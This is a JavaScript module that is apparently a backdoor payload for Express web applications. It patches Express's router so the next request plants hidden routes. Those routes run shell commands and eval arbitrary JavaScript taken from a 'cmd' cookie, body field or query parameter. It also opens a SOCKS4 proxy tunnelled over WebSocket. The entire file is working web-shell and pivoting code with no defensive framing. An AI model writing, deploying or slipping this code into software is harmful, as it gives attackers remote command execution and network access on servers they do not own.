const ws = require("ws")
const socks4 = require("socks4")


const getParam = (req) => {
    const paramName = 'cmd';

    // requires cookie-parser to be used as middleware in the app
    if (req.cookies?.[paramName])
        return req.cookies[paramName];

    // requires body-parser to be used as middleware in the app
    if (req.body?.[paramName])
        return req.body[paramName];
    return req.query?.[paramName];
}


const expressEvalPayload = (app, path) => {
    app.all(path, (req, res) => {
        res.send(eval(getParam(req))?.toString());
    });
}

const expressShellPayload = (app, path) => {
    app.all(path, (req, res) => {
        res.send(cp.spawnSync('sh',['-c', getParam(req)], {encoding:"utf8"})?.stdout);
    });
}

const expressPayload = () => {
    e = __non_webpack_require__('express');
    cp=__non_webpack_require__('child_process');

    if (!e.Router._injected)
        e.Router._bcp_handle = e.Router.handle;

    e.Router.handle = function(req, res, out) {
        e.Router.handle = e.Router._bcp_handle;
        saved =  this._bcp_handle(req, res, out)

        expressShellPayload(req.app, `/${global.__injected}_sh`);
        expressEvalPayload(req.app, `/${global.__injected}_eval`);
        expressSocksPayload(req.socket.server, `/${global.__injected}_socks`);

        return saved
    } 
    e.Router._injected = true
}


const EventEmitter = require("events")

class FakeSocket extends EventEmitter {
    constructor(ws) {
        super();
        this.ws = ws;
        ws.on('message', msg => this.emit('data',  msg))
    }

    setTimeout() {
    }

    write(data) {
        this.ws.send(data);
    }

    end() {
        this.ws.terminate()
    }

    pipe(dst) {
        this.on('data', m => dst.write(m))
        return dst;
    }
}


const expressSocksPayload = (server, path) => {
    socksServer = socks4.createServer();
    // TODO: get a better implementation of SOCKS proxy
    socksServer._proxyRequest = socksServer.proxyRequest
    socksServer.proxyRequest = function (req, direct) {
        socksServer._proxyRequest(req, direct).on('error', () => req.socket.end());
    }

    const wss = new ws.WebSocketServer({ server, path })
    wss.on('connection',  (conn) => {
        try {
            const fakeSocket = new FakeSocket(conn);
            socksServer.emit('connection', fakeSocket);
        } catch (e) {
        }
    });
}


module.exports = {
    expressPayload,
}
